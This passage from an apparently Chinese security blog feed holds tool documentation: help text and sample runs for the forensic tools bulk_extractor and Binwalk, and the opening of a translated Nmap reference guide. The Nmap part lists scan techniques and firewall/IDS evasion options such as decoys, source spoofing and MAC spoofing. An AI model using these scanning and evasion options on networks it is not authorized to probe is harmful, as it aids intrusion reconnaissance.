关闭除指定扫描器以外的所有扫描器</div><div class="line">                   （与-x all -e &lt;scanner&gt;效果一样）</div><div class="line">                    注意：-e，-x和-E命令按顺序执行</div><div class="line">                    例如：&apos;-E gzip -e facebook&apos;只运行gzip和facebook</div><div class="line">   -S name = value - 将批量提取器选项名称设置为值</div><div class="line"></div><div class="line"></div><div class="line">可设置选项（及其默认值）：</div><div class="line">   -S work_start_work_end = YES                   在report.xml文件中记录每个扫描器的工作开始和结束时间</div><div class="line">   -S enable_histograms = YES                     禁用生成直方图</div><div class="line">   -S debug_histogram_malloc_fail_frequency = 0   设置大于零记录内存分配失败直方图</div><div class="line">   -S hash_alg = md5                              指定用于所有哈希计算的哈希算法</div><div class="line">   -S dup_data_alerts =NO                         重复数据未处理时通知</div><div class="line">   -S write_feature_files = YES                   写入特征文件</div><div class="line">   -S write_feature_sqlite3 = NO                  将特征文件写入report.sqlite3</div><div class="line">   -S report_read_errors = YES                    报告读取错误</div><div class="line">   -S carve_net_memory = NO                       提取网络内存结构（net）</div><div class="line">   -S word_min = 6                                最小字大小（wordlist）</div><div class="line">   -S word_max = 14                               最大字大小（wordlist）</div><div class="line">   -S max_word_outfile_size = 100000000           输出文件的最大大小（wordlist）</div><div class="line">   -S wordlist_use_flatfiles = YES                覆盖SQL设置并对wordlist（wordlist）使用flatfiles</div><div class="line">   -S ssn_mode = 0                                0=正常格式; 1=不需要SSN; 2=去掉破折号（accts）</div><div class="line">   -S min_phone_digits = 7                        手机所需的数字（accts）</div><div class="line">   -S exif_debug = 0                              读取exif信息（exif）</div><div class="line">   -S jpeg_carve_mode = 1                         0=不提取; 1=雕刻编码提取; 2=全部提取（exif）</div><div class="line">   -S min_jpeg_size = 1000                        将被雕刻的最小的JPEG流（exif）</div><div class="line">   -S zip_min_uncompr_size = 6                    ZIP未压缩对象的最小大小（zip）</div><div class="line">   -S zip_max_uncompr_size = 268435456            ZIP未压缩对象的最大大小（zip）</div><div class="line">   -S zip_name_len_max = 1024                     ZIP组件的最大名称filename（zip）</div><div class="line">   -S unzip_carve_mode = 1                        0=不提取; 1=雕刻编码提取; 2=全部提取（zip）</div><div class="line">   -S rar_find_components = YES                   搜索RAR组件（rar）</div><div class="line">   -S rar_find_volumes = YES                      搜索RAR卷（rar）</div><div class="line">   -S unrar_carve_mode = 1                        0=不提取; 1=雕刻编码提取; 2=全部提取（rar）</div><div class="line">   -S gzip_max_uncompr_size = 268435456           解压缩GZIP对象的最大大小（gzip）</div><div class="line">   -S pdf_dump = NO                               转储PDF缓冲区的内容（pdf）</div><div class="line">   -S pdf_dump = NO                               转储PDF缓冲区的内容（msxml）</div><div class="line">   -S winpe_carve_mode = 1                        0=不提取; 1=雕刻编码提取; 2=全部提取（winpe）</div><div class="line">   -S opt_weird_file_size = 157286400             FAT32扫描（windir）的阈值</div><div class="line">   -S opt_weird_file_size2 = 536870912            FAT32扫描（windir）的阈值</div><div class="line">   -S opt_weird_cluster_count = 67108864          FAT32扫描（windir）的阈值</div><div class="line">   -S opt_weird_cluster_count2 = 268435456        FAT32扫描（windir）的阈值</div><div class="line">   -S opt_max_bits_in_attrib = 3                  忽略更多属性设置的FAT32条目（windirs）</div><div class="line">   -S opt_max_weird_count = 2                     忽略奇怪的FAT32条目（windirs）</div><div class="line">   -S opt_last_year = 2022                        忽略晚于此FAT32条目（windirs）</div><div class="line">   -S xor_mask = 255                              设置XOR掩码值，十进制格式（xor）</div><div class="line">   -S sqlite_carve_mode = 2                       0=不提取; 1=雕刻编码提取; 2=全部提取（sqlite）</div><div class="line"></div><div class="line">以下扫描默认禁用;启用使用-e命令：</div><div class="line">   -e base16   - 启用扫描base16</div><div class="line">   -e facebook - 启用扫描facebook</div><div class="line">   -e outlook  - 启用扫描outlook</div><div class="line">   -e sceadan  - 启用扫描sceadan</div><div class="line">   -e wordlist - 启用扫描wordlist</div><div class="line">   -e xor      - 启用扫描xor</div><div class="line"></div><div class="line">以下扫描默认启用;禁用使用-x命令：</div><div class="line">   -x accts    - 禁用扫描程序</div><div class="line">   -x aes      - 禁用扫描aes</div><div class="line">   -x base64   - 禁用扫描base64</div><div class="line">   -x elf      - 禁用扫描elf</div><div class="line">   -x mail     - 禁用扫描邮件</div><div class="line">   -x exif     - 禁用扫描exif</div><div class="line">   -x find     - 禁用扫描发现</div><div class="line">   -x gps      - 禁用扫描gps</div><div class="line">   -x gzip     - 禁用扫描gzip</div><div class="line">   -x hiberfile- 禁用扫描hiberfile</div><div class="line">   -x httplogs - 禁用扫描httplogs</div><div class="line">   -x json     - 禁用扫描json</div><div class="line">   -x kml      - 禁用扫描kml</div><div class="line">   -x msxml    - 禁用扫描msxml</div><div class="line">   -x net      - 禁用扫描net</div><div class="line">   -x pdf      - 禁用扫描pdf</div><div class="line">   -x rar      - 禁用扫描rar</div><div class="line">   -x sqlite   - 禁用扫描sqlite</div><div class="line">   -x vcard    - 禁用扫描vcard</div><div class="line">   -x windirs  - 禁用扫描windirs</div><div class="line">   -x winlnk   - 禁用扫描winlnk</div><div class="line">   -x winpe    - 禁用扫描winpe</div><div class="line">   -x zip      - 禁用扫描zip</div><div class="line">   -x winprefetch - 禁用扫描winprefetch</div></pre></td></tr></table></figure><p></p><h2 id="0x02-示例"><a href="#0x02-示例" class="headerlink" title="0x02 示例"></a>0x02 示例</h2><p>分析映像文件后，将结果导出到输出目录（-o bulk-out）（xp-laptop-2005-07-04-1430.img）：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">root@kali:~# bulk_extractor -o bulk-out xp-laptop-2005-07-04-1430.img</div><div class="line">bulk_extractor version 1.6.0-dev</div><div class="line">Hostname: kali</div><div class="line">Input file: xp-laptop-2005-07-04-1430.img</div><div class="line">Output directory: bulk-out</div><div class="line">Disk Size: 536715264</div><div class="line">Threads: 1</div><div class="line">Phase 1.</div><div class="line">13:02:46 Offset 0MB (0.00%) Done in n/a at 13:02:45</div><div class="line">13:03:39 Offset 67MB (12.50%) Done in  0:06:14 at 13:09:53</div><div class="line">13:04:43 Offset 134MB (25.01%) Done in  0:05:50 at 13:10:33</div><div class="line">13:04:55 Offset 201MB (37.51%) Done in  0:03:36 at 13:08:31</div><div class="line">13:06:01 Offset 268MB (50.01%) Done in  0:03:15 at 13:09:16</div><div class="line">13:06:48 Offset 335MB (62.52%) Done in  0:02:25 at 13:09:13</div><div class="line">13:07:04 Offset 402MB (75.02%) Done in  0:01:25 at 13:08:29</div><div class="line">13:07:20 Offset 469MB (87.53%) Done in  0:00:39 at 13:07:59</div><div class="line">All Data is Read; waiting for threads to finish...</div><div class="line">Time elapsed waiting for 1 thread to finish:</div><div class="line">     (please wait for another 60 min .)</div><div class="line">Time elapsed waiting for 1 thread to finish:</div><div class="line">    6 sec (please wait for another 59 min 54 sec.)</div><div class="line">Thread 0: Processing 520093696</div><div class="line"></div><div class="line">Time elapsed waiting for 1 thread to finish:</div><div class="line">    12 sec (please wait for another 59 min 48 sec.)</div><div class="line">Thread 0: Processing 520093696</div><div class="line"></div><div class="line">Time elapsed waiting for 1 thread to finish:</div><div class="line">    18 sec (please wait for another 59 min 42 sec.)</div><div class="line">Thread 0: Processing 520093696</div><div class="line"></div><div class="line">Time elapsed waiting for 1 thread to finish:</div><div class="line">    24 sec (please wait for another 59 min 36 sec.)</div><div class="line">Thread 0: Processing 520093696</div><div class="line"></div><div class="line">Time elapsed waiting for 1 thread to finish:</div><div class="line">    30 sec (please wait for another 59 min 30 sec.)</div><div class="line">Thread 0: Processing 520093696</div><div class="line"></div><div class="line">All Threads Finished!</div><div class="line">Producer time spent waiting: 335.984 sec.</div><div class="line">Average consumer time spent waiting: 0.143353 sec.</div><div class="line">*******************************************</div><div class="line">** bulk_extractor is probably CPU bound. **</div><div class="line">**    Run on a computer with more cores  **</div><div class="line">**      to get better performance.       **</div><div class="line">*******************************************</div><div class="line">Phase 2. Shutting down scanners</div><div class="line">Phase 3. Creating Histograms</div><div class="line">   ccn histogram...   ccn_track2 histogram...   domain histogram...</div><div class="line">   email histogram...   ether histogram...   find histogram...</div><div class="line">   ip histogram...   tcp histogram...   telephone histogram...</div><div class="line">   url histogram...   url microsoft-live...   url services...</div><div class="line">   url facebook-address...   url facebook-id...   url searches...</div><div class="line"></div><div class="line">Elapsed time: 378.5 sec.</div><div class="line">Overall performance: 1.418 MBytes/sec.</div><div class="line">Total email features found: 899</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> forensics </tag>
            
            <tag> kali linux </tag>
            
            <tag> 取证分析 </tag>
            
            <tag> bulk-extractor </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux取证分析之Binwalk]]></title>
      <url>/2017/09/07/Kali-Linux%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E4%B9%8BBinwalk/</url>
      <content type="html"><![CDATA[<h2 id="0x00-Binwalk介绍"><a href="#0x00-Binwalk介绍" class="headerlink" title="0x00 Binwalk介绍"></a>0x00 Binwalk介绍</h2><p>Binwalk是用于搜索给定二进制镜像文件以获取嵌入的文件和代码的工具。 具体来说，它被设计用于识别嵌入固件镜像内的文件和代码。 Binwalk使用libmagic库，因此它与Unix文件实用程序创建的魔数签名兼容。 Binwalk还包括一个自定义魔数签名文件，其中包含常见的诸如压缩/存档文件，固件头，Linux内核，引导加载程序，文件系统等的固件映像中常见文件的改进魔数签名。<br><a id="more"></a></p><p><a href="http://binwalk.org/" target="_blank" rel="external">主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/binwalk.git;a=summary" target="_blank" rel="external">仓库</a></p><ul><li>作者：Craig Heffner</li><li>证书：MIT</li></ul><h2 id="0x01-功能"><a href="#0x01-功能" class="headerlink" title="0x01 功能"></a>0x01 功能</h2><p>一个固件分析工具<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line">root@kali:~# binwalk -h</div><div class="line"></div><div class="line">Binwalk v2.1.1</div><div class="line">Craig Heffner，http://www.binwalk.org</div><div class="line"></div><div class="line">用法：binwalk [选项] [文件1] [文件2] [文件3] ...</div><div class="line"></div><div class="line">扫描选项：</div><div class="line">    -B，-- signature         扫描目标文件的常见文件签名</div><div class="line">    -R，--raw = &lt;str&gt;        扫描目标文件的指定字符序列</div><div class="line">    -A，--opcodes            扫描目标文件中常见可执行代码</div><div class="line">    -m，--magic = &lt;file&gt;     指定要使用的自定义魔数签名文件</div><div class="line">    -b，--dumb               禁用智能签名关键字</div><div class="line">    -I，--invalid            显示结果标记为无效</div><div class="line">    -x，--exclude = &lt;str&gt;    排除与&lt;str&gt;匹配的结果</div><div class="line">    -y，--include = &lt;str&gt;    只显示匹配&lt;str&gt;的结果</div><div class="line"></div><div class="line">提取选项：</div><div class="line">    -e，--extract                  自动提取已知的文件类型</div><div class="line">    -D，--dd = &lt;type：ext：cmd&gt;    提取&lt;type&gt;签名，为文件扩展名为&lt;ext&gt;，然后执行&lt;cmd&gt;</div><div class="line">    -M，--matryoshka               递归扫描提取的文件</div><div class="line">    -d，--depth = &lt;int&gt;            限制matryoshka递归深度（默认值：8级深）</div><div class="line">    -C，--directory = &lt;str&gt;        将文件/文件夹提取到自定义目录（默认值：当前工作目录）</div><div class="line">    -j，--size = &lt;int&gt;             限制每个提取的文件的大小</div><div class="line">    -n，--count = &lt;int&gt;            限制提取文件的数量</div><div class="line">    -r，--rm                       提取后删除刻录文件</div><div class="line">    -z，--carve                    从文件中读取数据，但不执行提取实用程序</div><div class="line"></div><div class="line">熵分析选项：</div><div class="line">    -E，--entropy           计算文件熵</div><div class="line">    -F，--fast              计算更快，但不太详细的熵分析</div><div class="line">    -J，--save              将熵图保存为PNG图像</div><div class="line">    -Q，--nlegend           从熵图图中省略图例</div><div class="line">    -N，--nplot             不生成熵图</div><div class="line">    -H，--high = &lt;float&gt;    设置上升沿熵触发阈值（默认值：0.95）</div><div class="line">    -L，--low = &lt;float&gt;     设置下降沿熵触发阈值（默认值：0.85）</div><div class="line"></div><div class="line">原始压缩选项：</div><div class="line">    -X， --deflate          扫描原始deflate压缩流</div><div class="line">    -Z， --lzma             扫描原始LZMA压缩流</div><div class="line">    -P， --partial          浅度扫描，速度更快</div><div class="line">    -S， --stop             找到第一个结果后停止扫描</div><div class="line"></div><div class="line">二进制差异选项：</div><div class="line">    -W，--hexdump           执行文件或文件的hexdump/diff</div><div class="line">    -G，--green             只显示包含所有文件中相同字节的行</div><div class="line">    -i，--red               仅显示包含所有文件中不同字节的行</div><div class="line">    -U，--blue              只显示一些文件中包含不同字节的行</div><div class="line">    -w，--terse             只显示第一个文件的十六进制转储</div><div class="line"></div><div class="line">一般选项：</div><div class="line">    -l，--length = &lt;int&gt;    要扫描的字节数</div><div class="line">    -o，--offset = &lt;int&gt;    以此偏移开始扫描</div><div class="line">    -O，--base = &lt;int&gt;      向所有打印的偏移量添加基址</div><div class="line">    -K，--block = &lt;int&gt;     设置文件块大小</div><div class="line">    -g，--swap = &lt;int&gt;      扫描前每n个字节反转一次</div><div class="line">    -f，--log = &lt;file&gt;      将结果记录到文件</div><div class="line">    -c，--csv               将结果记录到CSV格式的文件中</div><div class="line">    -t，--term              格式化输出以适合终端窗口</div><div class="line">    -q，--quiet             禁止输出</div><div class="line">    -v，--verbose           详细输出</div><div class="line">    -h，--help              显示帮助</div><div class="line">    -a，--finclude = &lt;str&gt;  只扫描名称与此正则表达式匹配的文件</div><div class="line">    -p，--fexclude = &lt;str&gt;  不扫描名称与此正则表达式匹配的文件</div><div class="line">    -s，--status = &lt;int&gt;    启用指定端口上的状态服务器</div></pre></td></tr></table></figure><p></p><h2 id="0x02-用法示例"><a href="#0x02-用法示例" class="headerlink" title="0x02 用法示例"></a>0x02 用法示例</h2><p>在给定的固件文件（dd-wrt.v24-13064_VINT_mini.bin）上运行文件签名扫描（-B）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">root@kali:~# binwalk -B dd-wrt.v24-13064_VINT_mini.bin</div><div class="line"></div><div class="line">DECIMAL     HEX         DESCRIPTION</div><div class="line">-------------------------------------------------------------------------------------------------------------------</div><div class="line">0           0x0         TRX firmware header, little endian, header size: 28 bytes, image size: 2945024 bytes, CRC32: 0x4D27FDC4 flags: 0x0, version: 1</div><div class="line">28          0x1C        gzip compressed data, from Unix, NULL date: Wed Dec 31 19:00:00 1969, max compression</div><div class="line">2472        0x9A8       LZMA compressed data, properties: 0x6E, dictionary size: 2097152 bytes, uncompressed size: 2084864 bytes</div><div class="line">622592      0x98000     Squashfs filesystem, little endian, DD-WRT signature, version 3.0, size: 2320835 bytes,  547 inodes, blocksize: 131072 bytes, created: Mon Nov  2 07:24:06 2009</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> forensics </tag>
            
            <tag> kali linux </tag>
            
            <tag> binwalk </tag>
            
            <tag> 取证分析 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Nmap参考指南]]></title>
      <url>/2017/04/24/Nmap%E5%8F%82%E8%80%83%E6%8C%87%E5%8D%97/</url>
      <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/sunnyelf/Nmap-Reference-Guide" target="_blank" rel="external">Nmap-Reference-Guide</a></p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul><li><a href="#译注">译注</a></li><li><a href="#名称">名称</a></li><li><a href="#命令">命令</a></li><li><a href="#描述">描述</a></li><li><a href="#选项概要">选项概要</a></li><li><a href="#目标说明">目标说明</a></li><li><a href="#主机发现">主机发现</a></li><li><a href="#端口扫描基础">端口扫描基础</a></li><li><a href="#端口扫描技术">端口扫描技术</a></li><li><a href="#端口说明和扫描顺序">端口说明和扫描顺序</a></li><li><a href="#服务和版本探测">服务和版本探测</a></li><li><a href="#操作系统探测">操作系统探测</a></li><li><a href="#时间和性能">时间和性能</a></li><li><a href="#防火墙ids躲避和欺骗">防火墙/IDS躲避和欺骗</a></li><li><a href="#输出">输出</a></li><li><a href="#其它选项">其它选项</a></li><li><a href="#运行时交互">运行时交互</a></li><li><a href="#实例">实例</a></li><li><a href="#bugs">Bugs</a></li><li><a href="#作者">作者</a></li><li><a href="#法律事项版权许可证担保缺出口限制">法律事项(版权、许可证、担保(缺)、出口限制)</a></li></ul><a id="more"></a><h1 id="译注"><a href="#译注" class="headerlink" title="译注"></a>译注</h1><p>该Nmap参考指南中文版由<a href="mailto:fyang1024@gmail.com" target="_blank" rel="external">Fei Yang</a>和<a href="mailto:lilei_721@6611.org" target="_blank" rel="external">Lei Li</a> 从<a href="http://www.insecure.org/nmap/man/" target="_blank" rel="external">英文版本</a>翻译而来。 我们希望这将使全世界使用中文的人们更了解Nmap，但我们不能保证该译本和官方的 英文版本一样完整，也不能保证同步更新。 它可以在<a href="http://creativecommons.org/licenses/by/2.5/" target="_blank" rel="external">Creative Commons Attribution License</a>许可证下被修改并重新发布。</p><h1 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h1><p>nmap — 网络探测工具和安全/端口扫描器</p><h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><p>nmap [ &lt;扫描类型&gt; …] [ &lt;选项&gt; ] { &lt;扫描目标说明&gt; }</p><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><strong>注意</strong>:本文档描述了Nmap版本4.50。最新文档以英语 <a href="https://nmap.org/book/man.html" target="_blank" rel="external">https://nmap.org/book/man.html</a>提供。</p><p>Nmap (“Network Mapper(网络映射器)”) 是一款开放源代码的 网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，当然用它扫描单个 主机也没有问题。Nmap以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些 主机提供什么服务(应用程序名和版本)，那些服务运行在什么操作系统(包括版本信息)， 它们使用什么类型的报文过滤器/防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核， 许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息， 管理服务升级计划，以及监视主机和服务的运行。</p><p>Nmap输出的是扫描目标的列表，以及每个目标的补充信息，至于是哪些信息则依赖于所使用的选项。 “所感兴趣的端口表格”是其中的关键。那张表列出端口号，协议，服务名称和状态。状态可能是 open(开放的)，filtered(被过滤的)， closed(关闭的)，或者unfiltered(未被过滤的)。 Open(开放的)意味着目标机器上的应用程序正在该端口监听连接/报文。 filtered(被过滤的) 意味着防火墙，过滤器或者其它网络障碍阻止了该端口被访问，Nmap无法得知 它是 open(开放的) 还是 closed(关闭的)。 closed(关闭的) 端口没有应用程序在它上面监听，但是他们随时可能开放。 当端口对Nmap的探测做出响应，但是Nmap无法确定它们是关闭还是开放时，这些端口就被认为是 unfiltered(未被过滤的) 如果Nmap报告状态组合 open|filtered 和 closed|filtered时，那说明Nmap无法确定该端口处于两个状态中的哪一个状态。 当要求进行版本探测时，端口表也可以包含软件的版本信息。当要求进行IP协议扫描时 (-sO)，Nmap提供关于所支持的IP协议而不是正在监听的端口的信息。</p><p>除了所感兴趣的端口表，Nmap还能提供关于目标机的进一步信息，包括反向域名，操作系统猜测，设备类型，和MAC地址。</p><p>一个典型的Nmap扫描如例 1 “一个典型的Nmap扫描”所示。在这个例子中，唯一的选项是-A， 用来进行操作系统及其版本的探测，-T4 可以加快执行速度，接着是两个目标主机名。</p><p><strong>例 1. 一个典型的Nmap扫描</strong></p><pre><code># nmap -A -T4 scanme.nmap.org

Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up (0.029s latency).
rDNS record for 74.207.244.221: li86-221.members.linode.com
Not shown: 995 closed ports
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (protocol 2.0)
| ssh-hostkey: 1024 8d:60:f1:7c:ca:b7:3d:0a:d6:67:54:9d:69:d9:b9:dd (DSA)
|_2048 79:f8:09:ac:d4:e2:32:42:10:49:d3:bd:20:82:85:ec (RSA)
80/tcp   open     http        Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Go ahead and ScanMe!
646/tcp  filtered ldp
1720/tcp filtered H.323/Q.931
9929/tcp open     nping-echo  Nping echo
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.39
OS details: Linux 2.6.39
Network Distance: 11 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
[Cut first 10 hops for brevity]
11  17.65 ms li86-221.members.linode.com (74.207.244.221)

Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds
</code></pre><h1 id="选项概要"><a href="#选项概要" class="headerlink" title="选项概要"></a>选项概要</h1><p>当 Nmap 不带选项运行时，该选项概要会被输出，最新的版本在这里 <a href="http://www.insecure.org/nmap/data/nmap.usage.txt" target="_blank" rel="external">http://www.insecure.org/nmap/data/nmap.usage.txt</a>。它帮助人们记住最常用的选项，但不 能替代本手册其余深入的文档，一些晦涩的选项甚至不在这里。</p><pre><code>Usage: nmap [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
    Can pass hostnames, IP addresses, networks, etc.
    Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0-255.0-255.1-254
    -iL &lt;inputfilename&gt;: Input from list of hosts/networks
    -iR &lt;num hosts&gt;: Choose random targets
    --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks
    --excludefile &lt;exclude_file&gt;: Exclude list from file
HOST DISCOVERY:
    -sL: List Scan - simply list targets to scan
    -sP: Ping Scan - go no further than determining if host is online
    -P0: Treat all hosts as online -- skip host discovery
    -PS/PA/PU [portlist]: TCP SYN/ACK or UDP discovery probes to given ports
    -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
    -n/-R: Never do DNS resolution/Always resolve [default: sometimes resolve]
SCAN TECHNIQUES:
    -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
    -sN/sF/sX: TCP Null, FIN, and Xmas scans
    --scanflags &lt;flags&gt;: Customize TCP scan flags
    -sI &lt;zombie host[:probeport]&gt;: Idlescan
    -sO: IP protocol scan
    -b &lt;ftp relay host&gt;: FTP bounce scan
PORT SPECIFICATION AND SCAN ORDER:
    -p &lt;port ranges&gt;: Only scan specified ports
    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080
    -F: Fast - Scan only the ports listed in the nmap-services file)
    -r: Scan ports consecutively - don&apos;t randomize
SERVICE/VERSION DETECTION:
    -sV: Probe open ports to determine service/version info
    --version-light: Limit to most likely probes for faster identification
    --version-all: Try every single probe for version detection
    --version-trace: Show detailed version scan activity (for debugging)
OS DETECTION:
    -O: Enable OS detection
    --osscan-limit: Limit OS detection to promising targets
    --osscan-guess: Guess OS more aggressively
TIMING AND PERFORMANCE:
    -T[0-6]: Set timing template (higher is faster)
    --min-hostgroup/max-hostgroup &lt;msec&gt;: Parallel host scan group sizes
    --min-parallelism/max-parallelism &lt;msec&gt;: Probe parallelization
    --min_rtt_timeout/max-rtt-timeout/initial-rtt-timeout &lt;msec&gt;: Specifies probe round trip time.
    --host-timeout &lt;msec&gt;: Give up on target after this long
    --scan-delay/--max_scan-delay &lt;msec&gt;: Adjust delay between probes
FIREWALL/IDS EVASION AND SPOOFING:
    -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)
    -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys
    -S &lt;IP_Address&gt;: Spoof source address
    -e &lt;iface&gt;: Use specified interface
    -g/--source-port &lt;portnum&gt;: Use given port number
    --data-length &lt;num&gt;: Append random data to sent packets
    --ttl &lt;val&gt;: Set IP time-to-live field
    --spoof-mac &lt;mac address, prefix, or vendor name&gt;: Spoof your MAC address
OUTPUT:
    -oN/-oX/-oS/-oG &lt;file&gt;: Output scan results in normal, XML, s|&lt;rIpt kIddi3, and Grepable format, respectively, to the given filename.
    -oA &lt;basename&gt;: Output in the three major formats at once
    -v: Increase verbosity level (use twice for more effect)
    -d[level]: Set or increase debugging level (Up to 9 is meaningful)
    --packet-trace: Show all packets sent and received
    --iflist: Print host interfaces and routes (for debugging)
    --append-output: Append to rather than clobber specified output files
    --resume &lt;filename&gt;: Resume an aborted scan
    --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML
    --no_stylesheet: Prevent Nmap from associating XSL stylesheet w/XML output
MISC:
    -6: Enable IPv6 scanning
    -A: Enables OS detection and Version detection
    --datadir &lt;dirname&gt;: Specify custom Nmap data file location
    --send-eth/--send-ip: Send packets using raw ethernet frames or IP packets
    --privileged: Assume that the user is fully privileged
    -V: Print version number
    -h: Print this help summary page.
EXAMPLES:
    nmap -v -A scanme.nmap.org
    nmap -v -sP 192.168.0.0/16 10.0.0.0/8
    nmap -v -iR 10000 -P0 -p 80
</code></pre><h1 id="目标说明"><a href="#目标说明" class="headerlink" title="目标说明"></a>目标说明</h1><p>除了选项，所有出现在Nmap命令行上的都被视为对目标主机的说明。 最简单的情况是指定一个目标IP地址或主机名。</p><p>有时候您希望扫描整个网络的相邻主机。为此，Nmap支持CIDR风格的地址。您可以附加 一个/<numbit>在一个IP地址或主机名后面， Nmap将会扫描所有和该参考IP地址具有<numbit>相同比特的所有IP地址或主机。 例如，192.168.10.0/24将会扫描192.168.10.0 (二进制格式: 11000000 10101000 00001010 00000000)和192.168.10.255 (二进制格式: 11000000 10101000 00001010 11111111)之间的256台主机。 192.168.10.40/24 将会做同样的事情。假设主机 scanme.nmap.org的IP地址是205.217.153.62， scanme.nmap.org/16 将扫描205.217.0.0和205.217.255.255之间的65,536 个IP地址。 所允许的最小值是/1， 这将会扫描半个互联网。最大值是/32，这将会扫描该主机或IP地址， 因为所有的比特都固定了。</numbit></numbit></p><p>CIDR标志位很简洁但有时候不够灵活。例如，您也许想要扫描 192.168.0.0/16，但略过任何以.0或者.255 结束的IP地址，因为它们通常是广播地址。 Nmap通过八位字节地址范围支持这样的扫描 您可以用逗号分开的数字或范围列表为IP地址的每个八位字节指定它的范围。 例如，192.168.0-255.1-254 将略过在该范围内以.0和.255结束的地址。 范围不必限于最后的8位：0-255.0-255.13.37 将在整个互联网范围内扫描所有以13.37结束的地址。 这种大范围的扫描对互联网调查研究也许有用。</p><p>IPv6地址只能用规范的IPv6地址或主机名指定。 CIDR 和八位字节范围不支持IPv6，因为它们对于IPv6几乎没什么用。</p><p>Nmap命令行接受多个主机说明，它们不必是相同类型。命令<strong>nmap scanme.nmap.org 192.168.0.0/8 10.0.0，1，3-7.0-255</strong>将和您预期的一样执行。</p><p>虽然目标通常在命令行指定，下列选项也可用来控制目标的选择：</p><p><strong>-iL<inputfilename>(从列表中输入)</inputfilename></strong></p><p>从 <em><inputfilename></inputfilename></em>中读取目标说明。在命令行输入 一堆主机名显得很笨拙，然而经常需要这样。 例如，您的DHCP服务器可能导出10,000个当前租约的列表，而您希望对它们进行 扫描。如果您不是使用未授权的静态IP来定位主机，或许您想要扫描所有IP地址。 只要生成要扫描的主机的列表，用-iL 把文件名作为选项传给Nmap。列表中的项可以是Nmap在 命令行上接受的任何格式(IP地址，主机名，CIDR，IPv6，或者八位字节范围)。 每一项必须以一个或多个空格，制表符或换行符分开。 